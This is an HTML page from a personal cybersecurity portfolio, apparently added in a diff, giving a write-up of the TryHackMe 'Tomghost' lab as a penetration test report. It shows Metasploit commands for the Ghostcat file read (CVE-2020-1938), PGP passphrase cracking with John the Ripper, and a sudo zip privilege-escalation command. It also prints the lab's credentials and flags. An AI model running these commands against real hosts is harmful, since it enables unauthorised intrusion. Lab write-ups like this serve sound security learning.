@@ -1,0 +1,153 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="description" content="The Tomghost engagement targeted an Apache Tomcat 9.0.30 host. The exposed AJP connector was exploited via the Ghostcat vulnerability (CVE-2020-1938) to read th">
+    <meta name="author" content="dotne1">
+    <meta property="og:title" content="Tomghost — Penetration Test Report - dotne1 Write-Ups">
+    <meta property="og:type" content="website">
+    <title>Tomghost — Penetration Test Report - dotne1 Write-Ups</title>
+    <link rel="stylesheet" href="../styles.css">
+    <link rel="stylesheet" href="writeups.css">
+    <link rel="icon" type="image/x-icon" href="../favicon.ico">
+</head>
+<body>
+    <nav class="navbar">
+        <div class="nav-links">
+            <a href="../index.html" class="nav-link">Home</a>
+            <a href="../about-me.html" class="nav-link">About Me</a>
+            <a href="../projects.html" class="nav-link">Projects</a>
+            <a href="../writeups.html" class="nav-link">Write-Ups</a>
+            <a href="../resume.html" class="nav-link">Resume</a>
+            <a href="../feeds.html" class="nav-link">Feeds</a>
+        </div>
+    </nav>
+
+    <div class="container" role="main">
+<p class="back-link"><a href="../writeups.html">&larr; Back to Write-Ups</a></p>
+<h1 class="main-header">Tomghost — Penetration Test Report</h1>
+<p class="writeup-meta"><span class="tag">TryHackMe</span> <span class="tag diff diff-easy">Easy</span> <span class="dot">·</span> <span class="date">2026-06-05</span></p>
+<div class="writeup-content">
+<p><strong>Target:</strong> 10.66.184.180 <strong>Date:</strong> 2026-06-05 <strong>Objective:</strong> Chain exploits to capture user.txt and root.txt</p>
+<hr>
+<p>The Tomghost engagement targeted an Apache Tomcat 9.0.30 host. The exposed AJP connector was exploited via the Ghostcat vulnerability (CVE-2020-1938) to read the application's web.xml, which disclosed credentials for the skyfuck user. SSH access revealed an encrypted PGP credential file; cracking the private key's passphrase with John the Ripper decrypted credentials for the merlin user. Passwordless sudo access to zip was abused to execute commands as root and recover the root flag.</p>
+<hr>
+<h2>1. Reconnaissance</h2>
+<h3>Port Scan</h3>
+<pre><code>22/tcp   OpenSSH 7.2p2 Ubuntu
+53/tcp   DNS (tcpwrapped)
+8009/tcp Apache Jserv (AJP13) Protocol v1.3
+8080/tcp Apache Tomcat 9.0.30</code></pre>
+<p><strong>OS:</strong> Ubuntu 16.04.6 LTS (Xenial Xerus)</p>
+<hr>
+<h2>2. Initial Access — Ghostcat (CVE-2020-1938)</h2>
+<h3>2.1 Vulnerability</h3>
+<p>Apache Tomcat 9.0.30 exposes the AJP connector on port 8009. The AJP protocol does not properly validate request attributes, allowing an unauthenticated attacker to read arbitrary files from the web application directory via a crafted AJP request (CVE-2020-1938).</p>
+<h3>2.2 Exploitation</h3>
+<p>Used the Metasploit <code>auxiliary/admin/http/tomcat_ghostcat</code> module to read <code>/WEB-INF/web.xml</code>:</p>
+<pre><code>msf6 &gt; use auxiliary/admin/http/tomcat_ghostcat
+msf6 &gt; set RHOSTS 10.66.184.180
+msf6 &gt; set RPORT 8009
+msf6 &gt; set FILENAME /WEB-INF/web.xml
+msf6 &gt; run</code></pre>
+<h3>2.3 Credential Discovery</h3>
+<p>The web.xml contained credentials in a comment:</p>
+<pre><code>User: skyfuck
+Password: 8730281lkjlkjdqlksalks</code></pre>
+<p>SSH access as <code>skyfuck</code> was successful on port 22.</p>
+<hr>
+<h2>3. Lateral Movement — PGP Cracking</h2>
+<h3>3.1 PGP Files</h3>
+<p><code>skyfuck</code>'s home directory contained:</p>
+<ul>
+<li><code>credential.pgp</code> — encrypted file</li>
+<li><code>tryhackme.asc</code> — ASCII-armored PGP private key</li>
+</ul>
+<h3>3.2 Key Passphrase Cracking</h3>
+<p>Extracted the PGP key hash with <code>gpg2john</code> and cracked it with John the Ripper using rockyou.txt:</p>
+<pre><code>$ gpg2john tryhackme.asc &gt; hash.txt
+$ john --wordlist=rockyou.txt hash.txt
+...
+alexandru        (tryhackme)</code></pre>
+<p><strong>PGP Passphrase:</strong> <code>alexandru</code></p>
+<h3>3.3 Decrypted Credentials</h3>
+<p>Decrypted <code>credential.pgp</code> with the imported private key:</p>
+<pre><code>merlin:asuyusdoiuqoilkda312j31k2j123j1g23g12k3g12kj3gk12jg3k12j3kj123j</code></pre>
+<h3>3.4 User Flag</h3>
+<p>SSH as <code>merlin</code>:</p>
+<pre><code>$ ssh merlin@10.66.184.180
+$ cat ~/user.txt</code></pre>
+<p><strong>User Flag:</strong> <code>THM{GhostCat_1s_so_cr4sy}</code></p>
+<hr>
+<h2>4. Privilege Escalation — Sudo Zip</h2>
+<h3>4.1 Sudo Privileges</h3>
+<p><code>merlin</code> had passwordless sudo access to <code>/usr/bin/zip</code>:</p>
+<pre><code>$ sudo -l
+User merlin may run the following commands on ubuntu:
+    (root : root) NOPASSWD: /usr/bin/zip</code></pre>
+<h3>4.2 GTFOBins Exploitation</h3>
+<p>Used zip's <code>-T --unzip-command</code> to execute arbitrary commands as root:</p>
+<pre><code>$ sudo /usr/bin/zip /tmp/priv.zip /etc/hosts -T --unzip-command=&quot;cat /root/root.txt&quot;</code></pre>
+<h3>4.3 Root Flag</h3>
+<p><strong>Root Flag:</strong> <code>THM{Z1P_1S_FAKE}</code></p>
+<hr>
+<h2>5. Attack Chain Summary</h2>
+<table>
+<thead><tr>
+<th>Step</th>
+<th>Technique</th>
+<th>Result</th>
+</tr></thead><tbody>
+<tr>
+<td>1</td>
+<td>Ghostcat (CVE-2020-1938) AJP file read</td>
+<td>skyfuck credentials</td>
+</tr>
+<tr>
+<td>2</td>
+<td>PGP key cracking via John/rockyou</td>
+<td>PGP passphrase: alexandru</td>
+</tr>
+<tr>
+<td>3</td>
+<td>Decrypt credential.pgp</td>
+<td>merlin credentials</td>
+</tr>
+<tr>
+<td>4</td>
+<td>Sudo zip privilege escalation</td>
+<td>Root shell</td>
+</tr>
+</tbody></table>
+<h3>Flags</h3>
+<table>
+<thead><tr>
+<th>Flag</th>
+<th>Value</th>
+</tr></thead><tbody>
+<tr>
+<td>User</td>
+<td><code>THM{GhostCat_1s_so_cr4sy}</code></td>
+</tr>
+<tr>
+<td>Root</td>
+<td><code>THM{Z1P_1S_FAKE}</code></td>
+</tr>
+</tbody></table>
+<hr>
+<h2>6. Remediation Recommendations</h2>
+<ul>
+<li><strong>Upgrade Tomcat:</strong> Version 9.0.30 is vulnerable to CVE-2020-1938. Update to 9.0.31+.</li>
+<li><strong>Disable AJP if unused:</strong> The AJP connector on port 8009 should be disabled or restricted to internal networks.</li>
+<li><strong>Encrypt credentials securely:</strong> PGP-encrypted credential files with weak passphrases are easily reversed. Use a secrets management solution instead.</li>
+<li><strong>Audit sudo privileges:</strong> <code>/usr/bin/zip</code> should not be accessible with NOPASSWD. Follow least-privilege principles.</li>
+</ul>
+</div>
+    </div>
+
+    <footer class="footer">
+        <p>&copy; 2026 dotne1 - Cybersecurity Portfolio</p>
+    </footer>
+</body>
+</html>
